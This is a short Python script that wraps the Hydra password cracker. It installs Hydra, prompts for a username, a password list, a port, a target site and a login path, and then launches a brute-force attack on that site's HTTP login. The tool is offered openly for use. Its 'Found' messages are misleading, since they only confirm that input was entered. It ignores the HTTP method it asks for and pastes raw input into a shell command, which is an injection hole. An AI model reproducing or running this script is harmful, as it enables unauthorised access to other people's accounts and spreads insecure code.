print ("Checking Modules")
print ("If a error use setup.py")
print ("Thank you for use my tool")
print ("Starting Brute Force")

import os
os.system("")
os.system("sudo apt install hydra")
os.system("pkg install hydra")
os.system("apk add hydra")
os.system("clear")
os.system("figlet brute force")

target_username = input("Enter Username:")

if target_username:
    print ("Username Found")

password_list = input("Enter PassWord List:")

port_site = input("Port Target:")

if port_site:
    print ("Port Found")

site_target = input("Site Target:")

if site_target:
    print ("Site Target")

method = input("Enter Method HTTP-GET Or HTTP-POST:")

if method:
    print ("Method Found")

diretorio = input("dir  login from a site:")


if diretorio:
    print ("Found Dir")
    os.system (f"hydra -l {target_username} -P {password_list} -s {port_site} -f {site_target} http-get {diretorio}")

